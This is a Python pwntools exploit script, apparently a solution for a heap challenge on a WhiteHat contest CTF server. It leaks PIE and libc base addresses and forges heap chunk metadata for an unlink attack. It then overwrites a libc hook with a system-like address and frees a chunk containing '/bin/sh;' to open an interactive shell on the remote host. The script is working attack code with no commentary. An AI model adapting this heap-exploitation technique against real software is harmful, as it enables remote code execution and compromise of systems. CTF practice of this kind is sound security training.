from pwn import *

#s = remote('192.168.32.95',1234)
s = remote('challenges.whitehatcontest.kr', 47850)
def alloc(size, dat):
  s.recvuntil('>')
  s.sendline('46')
  s.sendline(str(size))
  s.sendline(dat)
def view(index):
  s.recvuntil('>')
  s.sendline('3')
  s.recvuntil('?')
  s.sendline(str(index))
def malloc(size,dat):
  s.recvuntil('>')
  s.sendline('1')
  s.recvuntil(':')
  s.sendline(str(size))
  s.recvuntil(':')
  s.sendline(dat)
def modify(index,dat):
  s.recvuntil('>')
  s.sendline('4')
  s.recvuntil(':')
  s.sendline(str(index))
  s.recvuntil(':')
  s.sendline(dat)
def free(index):
  s.recvuntil('>')
  s.sendline('2')
  s.recvuntil(':')
  s.sendline(str(index))
raw_input()
alloc(0x10,"A");
view(2)
pie = u64(s.recvuntil('1.')[-3-6:-3]+"\x00\x00") -0x941
log.info("PIE : 0x%x"%pie)
malloc(512,'A')
malloc(512,'A')
free(2)
malloc(512,'A')
view(2)
libc = u64(s.recvuntil('1.')[-3-6:-3]+"\x00\x00") - 0x3c4b41
log.info("LIBC : 0x%x"%libc)
malloc(152,"AA")
malloc(498,"\x00"*0x10)
malloc(512,'/bin/sh;')

dat = "A"*8
dat += p64(0x8)
dat += p64(pie+0x2020c0 - 0x18)
dat += p64(pie+0x2020c0 - 0x10)
dat += "A"*(144-len(dat))
dat += p64(152-8)
modify(5,dat)
free(6)
modify(5,p64(libc+0x3c67a8)+p64(0x10))
modify(4,p64(libc+0x45390))
s.interactive()
